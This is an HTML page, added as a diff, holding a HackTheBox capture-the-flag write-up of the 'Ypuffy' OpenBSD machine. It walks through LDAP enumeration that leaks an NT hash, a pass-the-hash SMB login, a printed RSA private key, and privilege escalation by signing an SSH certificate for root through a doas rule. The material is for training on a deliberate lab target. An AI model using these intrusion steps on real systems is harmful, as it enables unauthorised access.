@@ -1,0 +1,519 @@
+<!DOCTYPE html>
+<html lang="">
+    <head>
+         
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>Ypuffy - Writeup</title>
+        <style>
+
+    html body {
+        font-family: '', sans-serif;
+        background-color: white;
+    }
+
+    :root {
+        --accent: green;
+        --border-width:  5px ;
+    }
+
+</style>
+
+
+<link rel="stylesheet" href="https://0x23b.github.io/css/main.css">
+
+
+
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=">
+
+
+
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+ 
+
+
+
+
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<script>$(document).on('click', function() { $('.collapse').collapse('hide'); })</script>
+ <meta name="generator" content="Hugo 0.32.4" />
+        
+        
+        
+        
+        <script async src="https://www.googletagmanager.com/gtag/js?id=UA-91628530-1"></script>
+        <script>
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments)};
+          gtag('js', new Date());
+
+          gtag('config', 'UA-91628530-1');
+        </script>
+        
+    </head>
+
+    
+    <script type="text/javascript" async
+      src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+  </script>
+
+    <body>
+        
+
+        <nav class="navbar navbar-default navbar-fixed-top">
+
+            <div class="container">
+
+                <div class="navbar-header">
+
+                    <a class="navbar-brand visible-xs" href="#">Ypuffy - Writeup</a>
+					
+                    <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse">
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>
+                </div>
+
+                <div class="collapse navbar-collapse">
+
+                    
+                        <ul class="nav navbar-nav">
+                            
+                                <li><a href="https://0x23b.github.io/">Home</a></li>
+                            
+                                <li><a href="https://0x23b.github.io/about">About</a></li>
+                            
+                                <li><a href="https://0x23b.github.io/tags/">Tags</a></li>
+                            
+                                <li><a href="https://0x23b.github.io/posts/">Posts</a></li>
+                            
+                        </ul>
+                    
+
+                    
+                        <ul class="nav navbar-nav navbar-right">
+                            
+                                <li class="navbar-icon"><a href="https://github.com/0x23b/"><i class="fa fa-github"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="https://twitter.com/0x23b/"><i class="fa fa-twitter"></i></a></li>
+                            
+							<li class="navbar-icon"></li>
+
+                        </ul>
+						
+						<ul class="nav navbar-nav navbar-right">
+                        </ul>
+						
+						
+
+                    
+
+                </div>
+
+            </div>
+
+        </nav>
+
+
+<main>
+
+    <div class="item">
+
+    
+    
+    
+
+    
+    
+
+    <h4><a href="https://0x23b.github.io/posts/hackthebox/2019-02-09-htb_ypuffy_writeup/">Ypuffy - Writeup</a></h4>
+    <h5>February 9, 2019</h5>
+    
+    <a href="https://0x23b.github.io/tags/hackthebox"><kbd class="item-tag">HackTheBox</kbd></a>
+    
+    <a href="https://0x23b.github.io/tags/writeups"><kbd class="item-tag">Writeups</kbd></a>
+    
+
+</div>
+
+
+    <br> <div class="text-justify">
+
+<h1 id="ypuffy-writeup">Ypuffy - Writeup</h1>
+
+<p><img src="https://www.hackthebox.eu/storage/avatars/d390333828a6eddc399141e30d873873.png" alt="Ypuffy" /></p>
+
+<table>
+<thead>
+<tr>
+<th>OS</th>
+<th>Difficulty</th>
+<th>Points</th>
+<th>Release</th>
+<th>IP</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>OpenBSD</td>
+<td>Medium</td>
+<td>30</td>
+<td>15 Sep 2018</td>
+<td>10.10.10.107</td>
+</tr>
+</tbody>
+</table>
+
+<h2 id="summary">Summary</h2>
+
+<p>Interesting machine, which leaks username and a smbhash over ldap. This smbhash is used to logon via smbclient, to obtain a private key in ppk format. After this is converted to OpenSSL format, we can login to the system. For privilege escalation, we can use the OpenBSD equivalent for sudo, which allows us to use ssh-keygen. We get the root user password as CA principle through an intended misconfiguration and can sign the ssh-key with the root user.</p>
+
+<h2 id="nmap">Nmap</h2>
+
+<p>First of all, lets do a mandatory port scan with nmap:</p>
+
+<pre><code class="language-bash">root@kali:~/HTB/Ypuffy# nmap -sC -sV -oA nmap 10.10.10.107
+# Nmap 7.70 scan initiated Sat Sep 15 15:26:06 2018 as: nmap -sC -sV -oA nmap 10.10.10.107
+Nmap scan report for 10.10.10.107
+Host is up (0.043s latency).
+Not shown: 995 closed ports
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.7 (protocol 2.0)
+| ssh-hostkey:
+|   2048 2e:19:e6:af:1b:a7:b0:e8:07:2a:2b:11:5d:7b:c6:04 (RSA)
+|   256 dd:0f:6a:2a:53:ee:19:50:d9:e5:e7:81:04:8d:91:b6 (ECDSA)
+|_  256 21:9e:db:bd:e1:78:4d:72:b0:ea:b4:97:fb:7f:af:91 (ED25519)
+80/tcp  open  http        OpenBSD httpd
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: YPUFFY)
+389/tcp open  ldap        (Anonymous bind OK)
+445/tcp open  netbios-ssn Samba smbd 4.7.6 (workgroup: YPUFFY)
+Service Info: Host: YPUFFY
+
+Host script results:
+|_clock-skew: mean: 1h20m01s, deviation: 2h18m36s, median: 0s
+| smb-os-discovery:
+|   OS: Windows 6.1 (Samba 4.7.6)
+|   Computer name: ypuffy
+|   NetBIOS computer name: YPUFFY\x00
+|   Domain name: hackthebox.htb
+|   FQDN: ypuffy.hackthebox.htb
+|_  System time: 2018-09-15T15:26:37-04:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2018-09-15 15:26:34
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat Sep 15 15:26:43 2018 -- 1 IP address (1 host up) scanned in 37.11 seconds
+</code></pre>
+
+<p>Here we have seen, that ldap is active on this machine, so lets enumerate that service with nmap:</p>
+
+<pre><code class="language-bash">root@kali:~/HTB/Ypuffy# nmap -p 389 --script ldap-search -oA ldap-enum 10.10.10.107
+# Nmap 7.70 scan initiated Sun Sep 16 07:29:40 2018 as: nmap -p 389 --script ldap-search -oA ldap-enum 10.10.10.107
+Nmap scan report for 10.10.10.107
+Host is up (0.024s latency).
+
+PORT    STATE SERVICE
+389/tcp open  ldap
+| ldap-search:
+|   Context: dc=hackthebox,dc=htb
+|     dn: dc=hackthebox,dc=htb
+|         dc: hackthebox
+|         objectClass: top
+|         objectClass: domain
+|     dn: ou=passwd,dc=hackthebox,dc=htb
+|         ou: passwd
+|         objectClass: top
+|         objectClass: organizationalUnit
+|     dn: uid=bob8791,ou=passwd,dc=hackthebox,dc=htb
+|         uid: bob8791
+|         cn: Bob
+|         objectClass: account
+|         objectClass: posixAccount
+|         objectClass: top
+|         userPassword: {BSDAUTH}bob8791
+|         uidNumber: 5001
+|         gidNumber: 5001
+|         gecos: Bob
+|         homeDirectory: /home/bob8791
+|         loginShell: /bin/ksh
+|     dn: uid=alice1978,ou=passwd,dc=hackthebox,dc=htb
+|         uid: alice1978
+|         cn: Alice
+|         objectClass: account
+|         objectClass: posixAccount
+|         objectClass: top
+|         objectClass: sambaSamAccount
+|         userPassword: {BSDAUTH}alice1978
+|         uidNumber: 5000
+|         gidNumber: 5000
+|         gecos: Alice
+|         homeDirectory: /home/alice1978
+|         loginShell: /bin/ksh
+|         sambaSID: S-1-5-21-3933741069-3307154301-3557023464-1001
+|         displayName: Alice
+|         sambaAcctFlags: [U          ]
+|         sambaPasswordHistory: 00000000000000000000000000000000000000000000000000000000
+|         sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B
+|         sambaPwdLastSet: 1532916644
+|     dn: ou=group,dc=hackthebox,dc=htb
+|         ou: group
+|         objectClass: top
+|         objectClass: organizationalUnit
+|     dn: cn=bob8791,ou=group,dc=hackthebox,dc=htb
+|         objectClass: posixGroup
+|         objectClass: top
+|         cn: bob8791
+|         userPassword: {crypt}*
+|         gidNumber: 5001
+|     dn: cn=alice1978,ou=group,dc=hackthebox,dc=htb
+|         objectClass: posixGroup
+|         objectClass: top
+|         cn: alice1978
+|         userPassword: {crypt}*
+|         gidNumber: 5000
+|     dn: sambadomainname=ypuffy,dc=hackthebox,dc=htb
+|         sambaDomainName: YPUFFY
+|         sambaSID: S-1-5-21-3933741069-3307154301-3557023464
+|         sambaAlgorithmicRidBase: 1000
+|         objectclass: sambaDomain
+|         sambaNextUserRid: 1000
+|         sambaMinPwdLength: 5
+|         sambaPwdHistoryLength: 0
+|         sambaLogonToChgPwd: 0
+|         sambaMaxPwdAge: -1
+|         sambaMinPwdAge: 0
+|         sambaLockoutDuration: 30
+|         sambaLockoutObservationWindow: 30
+|         sambaLockoutThreshold: 0
+|         sambaForceLogoff: -1
+|         sambaRefuseMachinePwdChange: 0
+|_        sambaNextRid: 1001
+
+# Nmap done at Sun Sep 16 07:29:40 2018 -- 1 IP address (1 host up) scanned in 0.50 seconds
+</code></pre>
+
+<p>From the enumeration we can see two things: a list of users (<code>alice1978</code> and <code>bob8791</code>) and a samba NT password <code>0B186E661BBDBDCF6047784DE8B9FD8B</code>. We can use this password, to login to smb. Lets see, what we can do there.</p>
+
+<h2 id="smb-enumeration">SMB Enumeration</h2>
+
+<p>At this point I added the IP to <code>/etc/hosts</code> with <code>ypuffy.hackthebox.htb</code>.</p>
+
+<p>First of all, we have to see, what directories are available. Herefore we can use smbclient to list all available services with the option <code>-L</code>.</p>
+
+<pre><code class="language-bash">smbclient -L //ypuffy.hackthebox.htb -U alice1978 --pw-nt-hash
+Enter WORKGROUP\alice1978's password: &lt;SMBHASH HERE&gt;
+
+    Sharename       Type      Comment
+    ---------       ----      -------
+    alice           Disk      Alice's Windows Directory
+    IPC$            IPC       IPC Service (Samba Server)
+Reconnecting with SMB1 for workgroup listing.
+
+    Server               Comment
+    ---------            -------
+
+    Workgroup            Master
+    ---------            -------
+</code></pre>
+
+<p>Here we can see, that there is a directory called &lsquo;alice&rsquo;. Let&rsquo;s connect to it again using smbclient!</p>
+
+<pre><code class="language-bash">root@kali:~/HTB/Ypuffy# smbclient -b -L //ypuffy.hackthebox.htb/alice -U alice1978 --pw-nt-hash
+Enter WORKGROUP\alice1978's password: &lt;SMBHASH HERE&gt;
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Mon Jul 30 22:54:20 2018
+  ..                                  D        0  Mon Sep 17 16:28:24 2018
+  my_private_key.ppk                  A     1460  Mon Jul 16 21:38:51 2018
+
+        433262 blocks of size 1024. 411470 blocks available
+smb: \&gt; get my_private_key.ppk
+getting file \my_private_key.ppk of size 1460 as my_private_key.ppk (0,6 KiloBytes/sec) (average 0,6 KiloBytes/sec)
+
+root@kali:~/HTB/Ypuffy# file my_private_key.ppk
+my_private_key.ppk: ASCII text, with CRLF line terminators
+</code></pre>
+
+<p>We found a private key in private putty key format, so we have to convert it into openssh format with puttygen.</p>
+
+<h2 id="key-conversion">Key conversion</h2>
+
+<pre><code class="language-bash">root@kali:~/HTB/Ypuffy# puttygen my_private_key.ppk -O private-openssh -o id_rsa
+root@kali:~/HTB/Ypuffy# cat id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEApV4X7z0KBv3TwDxpvcNsdQn4qmbXYPDtxcGz1am2V3wNRkKR
++gRb3FIPp+J4rCOS/S5skFPrGJLLFLeExz7Afvg6m2dOrSn02quxBoLMq0VSFK5A
+0Ep5Hm8WZxy5wteK3RDx0HKO/aCvsaYPJa2zvxdtp1JGPbN5zBAjh7U8op4/lIsk
+Hqr7DHtYeFpjZOM9duqlVxV7XchzW9XZe/7xTRrbthCvNcSC/SxaiA2jBW6n3dMs
+qpB8kq+b7RVnVXGbBK5p4n44JD2yJZgeDk+1JClS7ZUlbI5+6KWxivAMf2AqY5e1
+adjpOfo6TwmB0Cyx0rIYMvsog3HnqyHcVR/UfwIBJQKCAQB9JJx9saa5LsnB6Idf
+LBq5b1RlRugtr2fT7IgXT/+cJoaWCN0r5592S/AsBVRml3YnYWbpwvcZg9f0AIAo
+E8/xYecpfpxnXgVnNdISw9knqhSaB1Oki2KTklYkhHDmeZmEsuCCEYD3SSsC+jT5
+6zvqjkUkrPbilahHZii5uZWrfXUSVbRZRtrWe7bJmoUTP//XbuTCllnpiZVvT5kR
+mOrIQEzNzsPC6IzYJ6aBzYoAem/5HQ6M8ekSH/G9ahrPoGlNVuRVXoYlenTtjox1
+KFLQTBNNaMAS78I3Vf9Unmv5HGWu9k2CDKDdTFBBQt4ZQVXFm4svjtuyc5g84WHp
+9CatAoGBANTBwU1DttMKKphHAN23+tvIAh3rlNG6m+xeStOxEusrbNL89aEU03FW
+XIocoQlPiQBr3s8OkgMk1QVYABlH30Y2ZsPL/hp6l4UVEuHUqnTfEOowVTcVNlwp
+NM8YLhgn+JIeGpJZqus5JK/pBhK0JclenIpH5M2v4L9aKFwiMZxfAoGBAMb6j3Gu
+H6tm5CDwFnplwYZ2zNkhOfv3trhhT43PGM/iNH6pJUJNGTL25I/SL0fsH0pWe670
+B/MoMGBIf/PEWcmoFNPKQzWKaO37LXBVr/dos+GErF4+Uis/dhowp3fyyzZ5t6pb
+L5cljCBY6xLDzABBPt8jGZPw5h8lGNEZNLvhAoGAUICqAY8+QgPYw/8wwpikG88j
+ZURh0tD8uk0xEdRMWPusotxBQ95d19t89fz+qZO3TER90c4paPkuAgWfLCkIX8GO
+qvM9jXp+hWHreAtHan3quXoSZ96DRXdgFwI69GIms9QKDdy9NmimGQwQIsC0Wggf
+jkS3cGwP2bNpN548SQECgYEAvDkf6BNqENbzeRp2IMEe2SRFPBiC9URFD0dLQPRV
+vbpNVTg4AHJxyG0BuHq3GoVptQWzRKGmp747mVlWcPgB6EUMyFeLry/mt5qSxDVh
+Q/tCX7TaZvyul5zlVwtt+9fU/C3y7UGAC4Rh9RXXcp2Jn2BQOtwDcES+AcklUCyZ
+qs0CgYEAiOHSABguzA8sMxaHMvWu16F0RKXLOy+S3ZbMrQZr+nDyzHYPaLDRtNE2
+iI5cQLr38t6CRO6zEZ+08Zh5rbqLJ1n8i/q0Pv+nYoYlocxw3qodwUlUYcr1/sE+
+WuvlxTwgKNIb9U6L6OdSr5FGkFBCFldtZ/WSHtbHxBabb0zpdts=
+-----END RSA PRIVATE KEY-----
+</code></pre>
+
+<h2 id="login-with-private-key">Login with private key</h2>
+
+<pre><code class="language-bash">root@kali:~/HTB/Ypuffy# ssh -i id_rsa alice1978@10.10.10.107
+X11 forwarding request failed on channel 0
+OpenBSD 6.3 (GENERIC) #100: Sat Mar 24 14:17:45 MDT 2018
+
+Welcome to OpenBSD: The proactively secure Unix-like operating system.
+
+Please use the sendbug(1) utility to report bugs in the system.
+Before reporting a bug, please try to reproduce it with the latest
+version of the code.  With bug reports, please try to ensure that
+enough information to reproduce the problem is enclosed, and if a
+known fix for it exists, include that as well.
+
+ypuffy$
+</code></pre>
+
+<p>After enumerating the machine, we can find useful information in /etc/doas.conf. „Doas“ is the equivalent to sudo on OpenBSD, so this is quite helpful:</p>
+
+<pre><code class="language-bash">ypuffy$ cat /etc/doas.conf                                                     
+permit keepenv :wheel
+permit nopass alice1978 as userca cmd /usr/bin/ssh-keygen
+</code></pre>
+
+<p>Ok! There is another user, with whom we can generate and sign ssh keys. But first, we need a few more information for the signing. And this information we can get from the sshd_config file.</p>
+
+<h2 id="key-signing-and-rooting">Key signing and rooting</h2>
+
+<pre><code class="language-bash">ypuffy$ cat /etc/ssh/sshd_config
+...
+#AuthorizedPrincipalsFile none
+
+AuthorizedKeysCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=keys&amp;username=%u
+AuthorizedKeysCommandUser nobody
+
+TrustedUserCAKeys /home/userca/ca.pub
+AuthorizedPrincipalsCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=principals&amp;username=%u
+AuthorizedPrincipalsCommandUser nobody
+...
+</code></pre>
+
+<p>According to the documentation of sshd, AuthorizedPricipalsCommand returns us the list of of allowed certificate principals. With the mentioned command, we can also specify a username:</p>
+
+<pre><code class="language-bash">ypuffy$ curl &quot;http://localhost/sshauth?type=principals&amp;username=userca&quot;
+ypuffy$ curl &quot;http://localhost/sshauth?type=principals&amp;username=alice1978&quot;
+alice1978
+ypuffy$ curl &quot;http://localhost/sshauth?type=principals&amp;username=bob8791&quot;   
+bob8791
+ypuffy$ curl &quot;http://localhost/sshauth?type=principals&amp;username=root&quot;
+3m3rgencyB4ckd00r
+</code></pre>
+
+<p>3m3rgencyB4ckd00r looks like the password for the root user to sign. That’s the way to escalate privileges!</p>
+
+<ol>
+<li>Create a new ssh key<br /></li>
+<li>Sign it with doas command as user userca and the root password<br /></li>
+<li>Put the public key in authorized_keys<br /></li>
+<li>ssh as root on localhost<br /></li>
+</ol>
+
+<pre><code class="language-bash">ypuffy$ cd /tmp
+ypuffy$ ssh-keygen                                                                                     
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/alice1978/.ssh/id_rsa): /tmp/0x23b
+Enter passphrase (empty for no passphrase):
+Enter same passphrase again:
+Your identification has been saved in /tmp/0x23b.
+Your public key has been saved in /tmp/0x23b.pub.
+The key fingerprint is:
+SHA256:bAoxN/KeRLSgtSx9luPkSWffIYcHKXK+6MA1hknV8OM alice1978@ypuffy.hackthebox.htb
+The key's randomart image is:
++---[RSA 2048]----+
+|    o.+o  ..     |
+|   =.+.++ .o     |
+|  o.Bo%+=.o +    |
+|   .o#+O.o = .   |
+|   ..o*oE.. .    |
+|    o+.+.        |
+|     o+          |
+|      .          |
+|                 |
++----[SHA256]-----+
+ypuffy$ doas -u userca /usr/bin/ssh-keygen -s /home/userca/ca -I 0x23b -n 3m3rgencyB4ckd00r /tmp/0x23b
+Signed user key /tmp/0x23b-cert.pub: id &quot;0x23b&quot; serial 0 for 3m3rgencyB4ckd00r valid forever
+ypuffy$ cat 0x23b.pub &gt; /home/alice1978/.ssh/authorized_keys
+ypuffy$ ssh -i 0x23b root@localhost                                                                                                                                                                               
+OpenBSD 6.3 (GENERIC) #100: Sat Mar 24 14:17:45 MDT 2018
+
+Welcome to OpenBSD: The proactively secure Unix-like operating system.
+
+Please use the sendbug(1) utility to report bugs in the system.
+Before reporting a bug, please try to reproduce it with the latest
+version of the code.  With bug reports, please try to ensure that
+enough information to reproduce the problem is enclosed, and if a
+known fix for it exists, include that as well.
+
+ypuffy# id
+uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)
+ypuffy# cat root.txt
+12****************************7f
+</code></pre>
+</div>
+
+    
+    
+
+    
+
+    
+
+</main>
+
+        <footer>
+
+            <p class="copyright text-muted">&copy; All rights reserved. Powered by <a href="https://gohugo.io">Hugo</a> and <a href="https://github.com/calintat/minimal">Minimal</a></p>
+
+        </footer>
+       
+    </body>
+
+</html>
+
